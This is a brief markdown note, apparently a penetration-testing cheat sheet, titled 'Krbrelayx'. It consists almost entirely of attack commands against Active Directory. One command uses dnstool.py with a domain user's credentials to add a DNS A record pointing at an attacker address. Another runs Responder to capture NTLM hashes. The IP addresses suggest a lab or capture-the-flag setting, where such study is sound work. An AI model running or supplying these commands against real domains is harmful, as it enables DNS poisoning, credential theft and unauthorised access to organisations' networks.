---
title: "Krbrelayx"
date: 2024-7-23
tags: ["Krbrelayx", "dnstools", "active driectory", "ad", "Windows", "dns"]
---

---
### Tools

[krbrelayx](https://github.com/dirkjanm/krbrelayx)

### Abuse #1: Add Active Directory Integrated DNS records via LDAP

```bash
python3 dnstool.py -u <DOMAIN>\\<USER> -p <PASSWORD> --action add --record test --data 10.10.14.10 --type A 10.10.11.10
```

```bash
# Capture NTLM hash
sudo responder -I tun0
```

<br>